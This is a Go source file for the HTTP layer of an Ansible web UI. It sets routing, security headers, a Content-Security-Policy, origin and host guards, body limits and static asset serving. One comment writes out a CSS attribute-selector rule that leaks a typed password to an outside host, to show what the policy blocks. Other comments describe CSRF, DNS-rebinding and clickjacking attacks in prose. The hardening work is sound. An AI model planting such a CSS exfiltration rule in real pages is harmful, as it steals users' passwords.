// ansbui — a single-binary web UI for an Ansible control node.
// Copyright (C) 2026 AlteredParadox
//
// This program is free software: you can redistribute it and/or modify it
// under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
// FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License
// for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Package api wires the HTTP routes, owns the global handler
// dependencies, and serves the embedded web bundle.
package api

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net"
	"net/http"
	"net/netip"
	"strings"
	"sync"
	"time"

	"github.com/AlteredParadox/ansbui/internal/ansible"
	"github.com/AlteredParadox/ansbui/internal/auth"
	"github.com/AlteredParadox/ansbui/internal/bootstrap"
	"github.com/AlteredParadox/ansbui/internal/config"
	"github.com/AlteredParadox/ansbui/internal/jobs"
	"github.com/AlteredParadox/ansbui/internal/sshpool"
)

// Server is the HTTP API + static bundle.
type Server struct {
	Config  *config.Manager
	Pool    *sshpool.Pool
	Runs    *ansible.Recorder
	Jobs    *jobs.Manager
	WebRoot fs.FS

	// Addr is the -addr flag value the HTTP server binds to. The
	// origin guard uses its hostname part (when it is a DNS name)
	// as an allowed Host header value.
	Addr string

	// geo is constructed lazily on first use so apps that never turn
	// on geoip enrichment don't pay the dns-cache + http client cost.
	geoOnce sync.Once
	geo     *geoResolver

	// staticETags memoises content-hash ETags for embedded web assets.
	// The bundle is baked in at build time and never changes at runtime,
	// so each hash is computed once. Keyed by asset path.
	staticETags sync.Map

	// runSlots is the semaphore bounding concurrently executing
	// adhoc/playbook runs (see maxConcurrentRuns in ws.go). Lazily
	// created so Server stays constructible as a plain literal.
	runSlots     chan struct{}
	runSlotsOnce sync.Once

	// BootstrapHostKeys is the persistent TOFU store for bootstrap
	// target host keys (see bootstrap.HostKeyStore). Nil disables
	// recording (tests); main wires the real store.
	BootstrapHostKeys *bootstrap.HostKeyStore

	// Credential is the login password hash, or nil when no password
	// is configured. Nil puts the auth middleware in pass-through
	// mode (unauthenticated — the historical posture, behind a proxy).
	Credential *auth.Credential
	// Sessions is the live-session store backing the login cookie.
	// Always non-nil in production; a nil store makes every request
	// unauthenticated (treated like Credential == nil).
	Sessions *auth.SessionStore

	// TrustedProxies lists reverse proxies (from
	// ANSBUI_TRUSTED_PROXIES, parsed by main) whose X-Forwarded-For
	// is believed when attributing login attempts to a source IP.
	// Empty means RemoteAddr is always the source.
	TrustedProxies []netip.Prefix

	// Legal holds the embedded license texts and the build version.
	// The texts are served without login at /license and
	// /third-party-licenses, and /source redirects to the source of
	// this version (see legal.go).
	Legal Legal

	// loginLimit bounds concurrent Argon2 verifications and applies
	// the per-source token-bucket backoff (see loginlimit.go). The
	// zero value is ready to use.
	loginLimit loginLimiter

	// clock, when set, replaces time.Now for the login throttle, whose
	// behaviour is a function of elapsed time. Tests set it; a test
	// that reads the wall clock while verifying real argon2 hashes
	// passes or fails with the load on the machine.
	clock func() time.Time
}

// now is the server's notion of the current time (see clock).
func (s *Server) now() time.Time {
	if s.clock != nil {
		return s.clock()
	}
	return time.Now()
}

func (s *Server) geoResolver() *geoResolver {
	s.geoOnce.Do(func() { s.geo = newGeoResolver() })
	return s.geo
}

// Handler returns the http.Handler for the whole app.
func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()

	mux.HandleFunc("GET /api/health", s.health)
	mux.HandleFunc("GET /api/auth/status", s.handleAuthStatus)
	mux.HandleFunc("POST /api/login", limitBody(smallBody, s.handleLogin))
	mux.HandleFunc("POST /api/logout", limitBody(emptyBody, s.handleLogout))
	mux.HandleFunc("GET /api/servers", s.listServers)
	mux.HandleFunc("POST /api/servers", limitBody(smallBody, s.upsertServer))
	mux.HandleFunc("DELETE /api/servers/{id}", limitBody(emptyBody, s.deleteServer))
	mux.HandleFunc("POST /api/servers/{id}/activate", limitBody(emptyBody, s.activateServer))
	mux.HandleFunc("POST /api/servers/{id}/test", limitBody(emptyBody, s.testServer))
	mux.HandleFunc("GET /api/settings", s.getSettings)
	mux.HandleFunc("POST /api/settings", limitBody(smallBody, s.setSettings))

	mux.HandleFunc("GET /api/inventory", s.inventory)
	mux.HandleFunc("GET /api/metrics", s.metrics)
	mux.HandleFunc("GET /api/facts", s.getFacts)

	mux.HandleFunc("GET /api/playbooks", s.listPlaybooks)
	mux.HandleFunc("GET /api/playbooks/content", s.getPlaybook)
	mux.HandleFunc("PUT /api/playbooks/content", limitBody(largeBody, s.putPlaybook))

	mux.HandleFunc("GET /api/runs", s.listRuns)
	mux.HandleFunc("GET /api/runs/{id}", s.getRun)

	mux.HandleFunc("GET /api/vault", s.listVault)
	mux.HandleFunc("POST /api/vault/view", limitBody(smallBody, s.viewVault))
	mux.HandleFunc("POST /api/vault/content", limitBody(largeBody, s.writeVault))
	mux.HandleFunc("POST /api/vault/inline/list", limitBody(smallBody, s.listInlineVault))
	mux.HandleFunc("POST /api/vault/inline/decrypt", limitBody(smallBody, s.decryptInlineVault))
	mux.HandleFunc("POST /api/vault/inline/upsert", limitBody(largeBody, s.upsertInlineVault))
	mux.HandleFunc("GET /api/adhoc/stream", s.wsAdhoc)
	mux.HandleFunc("GET /api/playbook/stream", s.wsPlaybook)
	mux.HandleFunc("POST /api/bootstrap/start", limitBody(smallBody, s.httpBootstrapStart))
	mux.HandleFunc("GET /api/bootstrap/jobs", s.httpBootstrapList)
	mux.HandleFunc("GET /api/bootstrap/jobs/{id}", s.httpBootstrapGet)
	mux.HandleFunc("GET /api/bootstrap/jobs/{id}/log", s.httpBootstrapLog)
	mux.HandleFunc("POST /api/bootstrap/jobs/{id}/cancel", limitBody(emptyBody, s.httpBootstrapCancel))
	mux.HandleFunc("GET /api/bootstrap/jobs/{id}/stream", s.wsBootstrapStream)

	mux.HandleFunc("/api/", func(w http.ResponseWriter, r *http.Request) {
		writeError(w, http.StatusNotFound, fmt.Errorf("unknown API route %s %s", r.Method, r.URL.Path))
	})
	s.registerLegalRoutes(mux)
	mux.Handle("/", s.staticHandler())

	// Order: logging (outermost) → security headers → origin/host
	// guard → auth → mux. The headers sit outside the guards so the
	// 403 and 401 responses carry them too. The origin guard runs
	// before auth so a cross-origin or rebinding attempt is rejected
	// regardless of session state, and auth runs before the mux so no
	// guarded handler executes without a session.
	return withLogging(withSecurityHeaders(withOriginGuard(s.withAuth(mux), allowedHostnames(s.Addr))))
}

// contentSecurityPolicy is sent on every response. The UI is one page
// that holds every credential the operator types — the login password,
// SSH, sudo and vault passwords — so what that page may load, and
// where it may send anything, is pinned to ansbui itself:
//
//   - style-src 'self', font-src 'self': no stylesheet or font from
//     another origin, and no inline <style>. A stylesheet is enough to
//     read a password as it is typed: React keeps a controlled input's
//     value in the DOM attribute, and a rule such as
//     input[value$="ab"] { background: url(https://elsewhere/ab) }
//     reports each new suffix. The page used to link one from a font
//     host; the fonts now ship in web/fonts/.
//   - img-src 'self' data:, connect-src 'self': the requests such a
//     rule (or anything else in the page) could use to send data out —
//     background images, fetch, WebSocket — only reach this origin.
//   - default-src 'self' covers what is not listed (media, workers,
//     manifests, frames); object-src 'none' and base-uri 'none' close
//     plugins and <base> rewriting; form-action 'self'.
//   - frame-ancestors 'none': see withSecurityHeaders.
//
// script-src is the weak directive, on purpose and for now. The UI is
// compiled in the browser: Babel reads each <script type="text/babel">
// and runs the result by adding an inline <script> to the page, which
// needs 'unsafe-inline'. ('unsafe-eval' is not needed: the page was
// loaded without it in Chromium, Firefox and WebKit.) 'unsafe-inline'
// goes away only with a build step that ships plain .js files. Until
// then this policy limits what an injected script could load and
// where it could send data, not whether one could run.
const contentSecurityPolicy = "default-src 'self'; " +
	"script-src 'self' 'unsafe-inline'; " +
	"style-src 'self'; " +
	"img-src 'self' data:; " +
	"font-src 'self'; " +
	"connect-src 'self'; " +
	"object-src 'none'; " +
	"base-uri 'none'; " +
	"form-action 'self'; " +
	"frame-ancestors 'none'"

// hstsMaxAge is one year, the value browsers and scanners treat as a
// real commitment. No includeSubDomains: ansbui speaks for its own
// hostname, not for whatever else lives under the parent domain.
const hstsMaxAge = "max-age=31536000"

// withSecurityHeaders sets the response headers that every reply —
// the SPA shell, static assets, API JSON, error bodies — should carry.
//
//   - frame-ancestors 'none' (and X-Frame-Options: DENY for browsers
//     that predate it): no other origin may put the UI in a frame. The
//     Origin check cannot stop clickjacking, because a click inside a
//     framed copy of the real page IS a same-origin request; with no
//     password set, or behind proxy basic auth, one concealed click on
//     "Activate" or "Run" was enough.
//
//   - X-Content-Type-Options: nosniff, so JSON carrying operator data
//     is never reinterpreted as script or style by a page that includes
//     it cross-origin.
//
//   - Strict-Transport-Security on HTTPS requests only (browsers ignore
//     it over plain HTTP, and a loopback dev instance must not pin
//     itself). Once the browser has it, it stops loading
//     http://<this host> at all, which removes the plaintext page a
//     network attacker needs for the cross-scheme attack described at
//     checkSameOrigin. HSTS is per hostname, every port: a deployment
//     that also serves plain HTTP on another port of the SAME name
//     should give ansbui its own name.
func withSecurityHeaders(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hd := w.Header()
		hd.Set("Content-Security-Policy", contentSecurityPolicy)
		hd.Set("Referrer-Policy", "no-referrer")
		hd.Set("X-Frame-Options", "DENY")
		hd.Set("X-Content-Type-Options", "nosniff")
		if requestIsHTTPS(r) {
			hd.Set("Strict-Transport-Security", hstsMaxAge)
		}
		h.ServeHTTP(w, r)
	})
}

// withOriginGuard rejects HTTP requests whose Origin header is set
// and doesn't match the request's Host. It runs regardless of login
// state: with no password set anyone reaching the port can drive
// ansible-playbook and SSH-bootstrap fresh boxes, and even with the
// built-in login enabled the browser attaches the session cookie to
// requests a malicious page triggers. CORS quirks let such an
// origin fire-and-forget POSTs (and, for the bootstrap read
// endpoints that surface recent target IPs/hostnames, GETs) from
// the operator's browser if they have ansbui open in another tab.
// This guard mirrors the same-origin check the WebSocket upgrader
// enforces. (SameSite=Strict on the session cookie independently
// covers the cross-site cases for logged-in deployments.)
//
// Two layers, applied independently:
//
//   - Host allowlist (DNS-rebinding defence) on EVERY /api/ request,
//     read or write. Rebinding is primarily a read primitive: after
//     the rebind the attacker's page is same-origin and can GET
//     /api/inventory, /api/vault, /api/settings, /api/servers, etc.,
//     so a write-only Host check would leave the whole read surface
//     exfiltrating. The only tell is the Host header, which still
//     names the attacker's domain (see hostguard.go). Static assets
//     (the SPA shell under "/") are public and stay unguarded so the
//     page still loads; everything sensitive lives under /api/.
//
//   - Same-origin (CSRF defence) on EVERY /api/ request, reads
//     included. Cross-origin reads return opaque responses, but the
//     server-side work still runs — /api/facts alone can fan an
//     ansible setup run across the fleet — so a hostile page must not
//     be able to trigger them at all. checkSameOrigin rejects a
//     Sec-Fetch-Site that names another origin and an Origin whose
//     scheme or host:port differs from the request's; it is the same
//     function the WS upgrader uses, so the two never drift.
//
//   - Client marker on the reads that make ansbui do remote work
//     (see clientMarkerRequired). The same-origin check can only
//     judge what the browser tells it, and on the requests that
//     matter most here the browser may say nothing: a cross-site
//     <img>, a link, or a navigation is a GET with no Origin, and on
//     a plain-HTTP non-loopback origin there is no Sec-Fetch-Site
//     either. Those are indistinguishable from curl. So these routes
//     additionally require a header only our own page (or a
//     deliberate CLI caller) sends.
func withOriginGuard(h http.Handler, allowedHosts map[string]struct{}) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if hostGuardedRequest(r) && !hostAllowed(r.Host, allowedHosts) {
			writeError(w, http.StatusForbidden, fmt.Errorf("request Host %q not recognised (DNS-rebinding guard) — if ansbui is behind a reverse proxy, list its public hostname in %s", r.Host, allowedHostsEnv))
			return
		}
		if originGuardedRequest(r) {
			if err := checkSameOrigin(r); err != nil {
				writeError(w, http.StatusForbidden, err)
				return
			}
		}
		if clientMarkerRequired(r) && r.Header.Get(clientMarkerHeader) == "" {
			writeError(w, http.StatusForbidden, fmt.Errorf("an API read that can make ansbui contact the control node must carry the %s header when the request has no Origin (a page on another site cannot add it) — with curl: -H '%s: 1'", clientMarkerHeader, clientMarkerHeader))
			return
		}
		if hostGuardedRequest(r) {
			// API responses carry operator data — inventory, settings,
			// vault plaintext from /api/vault/view — that must never
			// land in a browser or proxy cache. Set centrally so a new
			// endpoint can't forget it; static assets keep their own
			// ETag + no-cache policy from serveStaticFile.
			w.Header().Set("Cache-Control", "no-store")
		}
		h.ServeHTTP(w, r)
	})
}

// clientMarkerHeader is the request header the SPA's fetch wrapper
// (web/data/api.js) adds to every call. Its value is not a secret and
// is not checked: what makes it a control is that a page on another
// origin cannot attach a custom header to a request without the
// browser first asking this server's permission (a CORS preflight),
// which ansbui never grants.
const clientMarkerHeader = "X-Ansbui-Request"

// clientMarkerRequired reports whether r must carry clientMarkerHeader:
// a GET or HEAD under /api/ that has no Origin header, unless the path
// is one of the local reads below.
//
// Why these requests. A mutating request from a browser always carries
// Origin, so checkSameOrigin has already judged it; so has any request
// that does carry one, which includes every browser WebSocket upgrade
// (they cannot send custom headers, and need not). What is left is the
// Origin-less read, which another site's page can cause the operator's
// browser to send blind.
//
// Why not all of them. Sec-Fetch-Site: none is not proof of intent
// either — a link opened from a mail or chat client arrives that way —
// so the marker is demanded regardless of Fetch Metadata. The exempt
// list is the reads answered from this process's own state, where a
// blind trigger makes nothing happen: they stay reachable with a bare
// curl, and the health check stays usable by a monitor. The list is
// the exemption, not the rule, so a new read route requires the
// marker unless someone decides it should not.
func clientMarkerRequired(r *http.Request) bool {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		return false
	}
	if !strings.HasPrefix(r.URL.Path, "/api/") || r.Header.Get("Origin") != "" {
		return false
	}
	return !localReadPath(r.URL.Path)
}

// localReadPath reports whether an API read is answered without any
// SSH session or outbound HTTP request: health, auth status, the
// server list, settings, run history and bootstrap job state.
func localReadPath(p string) bool {
	switch p {
	case "/api/health", "/api/auth/status", "/api/servers", "/api/settings", "/api/runs", "/api/bootstrap/jobs":
		return true
	}
	return strings.HasPrefix(p, "/api/runs/") || strings.HasPrefix(p, "/api/bootstrap/jobs/")
}

// hostGuardedRequest reports whether the DNS-rebinding Host check
// applies: every /api/ request (reads included), regardless of
// method. The static SPA shell served from "/" is deliberately
// excluded — it carries no operator data.
func hostGuardedRequest(r *http.Request) bool {
	return strings.HasPrefix(r.URL.Path, "/api/")
}

// originGuardedRequest reports whether the same-origin CSRF check
// applies: every /api/ request, regardless of method.
//
// This used to guard only state-mutating verbs plus an allowlist of
// three GET paths, which left every other API read triggerable by a
// hostile page the operator happened to visit. The responses stay
// unreadable cross-origin (we send no CORS headers), but the *work*
// still happened: GET /api/facts?host=all fans an ansible setup run
// across the whole fleet, and /api/inventory, /api/playbooks and
// /api/vault each spend a controller SSH round-trip. A blind trigger
// is still a trigger, so the check is now route-wide rather than an
// exception list that every new endpoint has to remember to join.
//
// Guarding reads costs legitimate callers nothing: checkSameOrigin
// rejects only what a browser has labelled as coming from elsewhere,
// and curl/CLI clients send neither label. The static SPA shell under
// "/" is untouched so the page still loads.
func originGuardedRequest(r *http.Request) bool {
	return strings.HasPrefix(r.URL.Path, "/api/")
}

// Body size caps for POST / PUT handlers. Control-plane payloads
// (server defs, settings, vault passwords) are tiny; playbook +
// vault-write bodies can reasonably be a few hundred kilobytes.
// emptyBody applies to verbs whose handler ignores the body (e.g.
// POST /activate, DELETE) — capping near-zero stops a malicious
// client from streaming arbitrary bytes onto the goroutine that
// http.Server still has to drain.
const (
	emptyBody = 1024
	smallBody = 64 * 1024
	largeBody = 1 * 1024 * 1024
)

// limitBody wraps an http.HandlerFunc so the request body is capped
// via http.MaxBytesReader. Requests over the cap get 413 before the
// handler sees them.
func limitBody(limit int64, h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		r.Body = http.MaxBytesReader(w, r.Body, limit)
		h(w, r)
	}
}

func (s *Server) staticHandler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Serve index.html at "/"; /api/ already handled above. Unknown
		// paths (and bare directories) fall back to index.html so client
		// routing survives deep links and refreshes.
		//
		// The path is the caller's. fs.ValidPath accepts only a clean,
		// relative, slash-separated name: no "..", no leading slash, not
		// empty. Anything else cannot name an asset, so it is treated
		// like any other unknown path. io/fs filesystems are expected to
		// refuse such names themselves, and embed.FS does; checking here
		// (and again in the two helpers that open the file) means that
		// staying inside WebRoot does not depend on which filesystem is
		// plugged in. static_test.go exercises it with one that does
		// not check.
		name := strings.TrimPrefix(r.URL.Path, "/")
		if !fs.ValidPath(name) {
			name = "index.html"
		}
		if fi, err := fs.Stat(s.WebRoot, name); err != nil || fi.IsDir() {
			name = "index.html"
		}
		s.serveStaticFile(w, r, name)
	})
}

// serveStaticFile writes an embedded asset with a content-hash ETag and
// Cache-Control: no-cache. The bundle is baked in at build time, so the
// hash is stable for the binary's life but changes whenever the file
// does — browsers revalidate cheaply (304) and always pick up a fresh
// build without a manual hard-refresh. embed.FS reports a zero modtime,
// so before this every response had no validator and stale JS lingered
// in browser caches (which is how a broken Bootstrap.jsx survived a fix).
func (s *Server) serveStaticFile(w http.ResponseWriter, r *http.Request, name string) {
	// Checked here as well as in staticHandler, so that this function
	// cannot be handed a name that leaves WebRoot by any caller.
	if !fs.ValidPath(name) {
		http.NotFound(w, r)
		return
	}
	f, err := s.WebRoot.Open(name)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	defer func() { _ = f.Close() }()
	rs, ok := f.(io.ReadSeeker)
	if !ok {
		// embed.FS files are seekable; this guards a future FS swap.
		http.Error(w, "asset not seekable", http.StatusInternalServerError)
		return
	}
	if etag := s.staticETag(name); etag != "" {
		w.Header().Set("Etag", etag)
		w.Header().Set("Cache-Control", "no-cache")
	}
	// Go's built-in extension table has no entry for web fonts, so the
	// type would otherwise depend on whether the host has a mime.types
	// file that lists them.
	if strings.HasSuffix(name, ".woff2") {
		w.Header().Set("Content-Type", "font/woff2")
	}
	// Zero modtime skips Last-Modified (embed has none); the ETag is the
	// validator. ServeContent matches If-None-Match against the ETag we
	// set and returns 304 when it matches, and infers Content-Type from
	// the name's extension unless one is already set.
	http.ServeContent(w, r, name, time.Time{}, rs)
}

// staticETag returns a strong content-hash ETag for an embedded asset,
// memoised since the bundle never changes at runtime. Empty string if
// the asset can't be read (caller then serves without a validator).
func (s *Server) staticETag(name string) string {
	if v, ok := s.staticETags.Load(name); ok {
		return v.(string)
	}
	// As in serveStaticFile: no name that leaves WebRoot is read.
	if !fs.ValidPath(name) {
		return ""
	}
	data, err := fs.ReadFile(s.WebRoot, name)
	if err != nil {
		return ""
	}
	sum := sha256.Sum256(data)
	etag := `"` + hex.EncodeToString(sum[:]) + `"`
	s.staticETags.Store(name, etag)
	return etag
}

func withLogging(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		rw := &statusRecorder{ResponseWriter: w, status: http.StatusOK}
		h.ServeHTTP(rw, r)
		if strings.HasPrefix(r.URL.Path, "/api/") {
			// %q on Method + Path so a request with embedded
			// CR/LF or control bytes can't forge a second log
			// line — gosec G706 (log injection via taint
			// analysis). r.URL.Path is operator-controlled at
			// the boundary, so quoting is the cheap fix.
			log.Printf("%q %q %d %s", r.Method, r.URL.Path, rw.status, time.Since(start))
		}
	})
}

type statusRecorder struct {
	http.ResponseWriter
	status int
}

func (r *statusRecorder) WriteHeader(code int) {
	r.status = code
	r.ResponseWriter.WriteHeader(code)
}

// Hijack delegates to the underlying ResponseWriter so gorilla/websocket
// can upgrade the connection. Without this the Upgrader fails with
// "response does not implement http.Hijacker" and the WebSocket never
// opens (browser sees a 500 and fires 'error').
func (r *statusRecorder) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	h, ok := r.ResponseWriter.(http.Hijacker)
	if !ok {
		return nil, nil, fmt.Errorf("underlying ResponseWriter does not support hijacking")
	}
	return h.Hijack()
}

// Flush delegates so SSE / chunked responses keep working. Cheap to add
// alongside Hijack since the same wrapper sits in front of every API
// handler.
func (r *statusRecorder) Flush() {
	if f, ok := r.ResponseWriter.(http.Flusher); ok {
		f.Flush()
	}
}

// writeJSON sends a JSON response. On encode error it logs — by the time
// we hit it the headers are already out so there's nothing useful to
// return to the client.
func writeJSON(w http.ResponseWriter, status int, body any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(body); err != nil {
		log.Printf("writeJSON: %v", err)
	}
}

// writeError returns {error: "..."} with the given status. kept tiny so
// every handler can call it without pulling in an error framework.
func writeError(w http.ResponseWriter, status int, err error) {
	writeJSON(w, status, map[string]string{"error": err.Error()})
}

func (s *Server) health(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}
